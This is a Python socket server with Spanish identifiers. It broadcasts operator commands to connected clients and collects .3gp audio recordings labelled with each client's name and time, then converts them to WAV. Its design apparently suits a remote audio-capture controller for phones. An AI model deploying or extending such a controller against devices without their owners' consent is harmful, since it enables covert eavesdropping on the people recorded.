import socket
from threading import Thread
import json
import struct
from pydub import AudioSegment


def deco(funcion):
    
    def envolvente(*args):
         
        thread = Thread(target=funcion, args=args)

        thread.start()
        
        return thread
        
    return envolvente

class Conexion:

    def __init__(self, host):

        self.host = host
    
        self.server =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.server.bind((host, 6191))
        
        self.server.listen()

        self.server_audio = socket.create_server((host, 6190))

        self.dict = {}

        self.stop = False
        
    @deco
    def recive(self):

        while True:
        
            client, address = self.server.accept()

            if self.stop == True:

                break

            print(f"{address[0]}:{address[1]} conectado.")

            self.dict[client]= {}        

    def close_client(self,):

        for client in self.dict:

            client.close()
        
        self.stop = True

        closer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        closer.connect((self.host, 6191))

class Servidor(Conexion):

    def rec_name_time(self, client):
        
        msj= client.recv(1024).decode("utf-8")

        msj = json.loads(msj)

        self.dict[client]= msj

    def send(self,):
         
         while True:
             
            msj= input('/>>>>>: ')
            
            if msj == 'close':

                self.close_client()

                break

            for client in self.dict:

                client.send(msj.encode())

                if msj == 'send':

                    return_comannd= self.rec_audio(client)

                if msj == 'rec':

                    self.rec_name_time(client)

                return_comannd= client.recv(1024).decode('utf-8')

                name= self.dict[client]['name']

                print(name, return_comannd)

    def receive_file_size(self, conn):

        fmt = "<Q"
        
        expected_bytes = struct.calcsize(fmt)
        
        received_bytes = 0
        
        stream = bytes()
        
        while received_bytes < expected_bytes:
        
            chunk = conn.recv(expected_bytes - received_bytes)
        
            stream += chunk
        
            received_bytes += len(chunk)
        
        filesize = struct.unpack(fmt, stream)[0]
        
        return filesize
    
    def receive_file(self, filename, conn):

        filesize = self.receive_file_size(conn)

        with open(filename, "wb") as f:
            
            received_bytes = 0

            while received_bytes < filesize:
                
                chunk = conn.recv(1024)
                
                if chunk:
                    
                    f.write(chunk)
                    
                    received_bytes += len(chunk)

    @deco
    def convert_audio(self, file):
                                                                         
        src = file + ".3gp"
        dst = file + ".wav"
                                                          
        sound = AudioSegment.from_file(src)
        
        sound.export(dst, format="wav")

    def rec_audio(self, client):
          
        print("Esperando al cliente...")
        
        conn, address = self.server_audio.accept()
        
        print(f"{address[0]}:{address[1]} conectado, recibiendo archivo...")
        
        file= self.dict[client]

        file= file['name'] + '*' + file['time']

        self.receive_file(file + '.3gp', conn)
        
        print(f"{file} recibido.")
    
        self.convert_audio(file)

if __name__ == "__main__":

    srv= Servidor('192.168.0.5')

    srv.recive()

    srv.send()
